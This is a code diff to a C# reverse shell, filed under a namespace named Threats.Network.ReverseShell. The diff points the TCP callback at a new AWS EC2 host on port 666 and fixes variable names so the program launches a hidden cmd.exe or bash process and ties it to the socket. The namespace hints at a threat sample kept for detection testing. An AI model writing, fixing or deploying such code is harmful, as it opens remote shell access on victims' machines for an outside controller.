@@ -3,6 +3,7 @@ using System.Diagnostics;
 using System.IO;
 using System.Net.Sockets;
 using System.Text;
+using System.Runtime.InteropServices;
 
 namespace Threats.Network.ReverseShell
 {
@@ -12,7 +13,7 @@ namespace Threats.Network.ReverseShell
 
         public static void Main(string[] args)
         {
-            using (TcpClient client = new TcpClient("ec2-63-35-224-89.eu-west-1.compute.amazonaws.com", 666))
+            using (TcpClient client = new TcpClient("ec2-54-229-112-113.eu-west-1.compute.amazonaws.com", 666))
             {
                 using (Stream stream = client.GetStream())
                 {
@@ -25,11 +26,11 @@ namespace Threats.Network.ReverseShell
                         Process p = new Process();
                         if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                         {
-                            process.StartInfo.FileName = @"cmd.exe";
+                            p.StartInfo.FileName = @"cmd.exe";
                         }
                         else
                         {
-                            process.StartInfo.FileName = @"bash";
+                            p.StartInfo.FileName = @"bash";
                         }
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
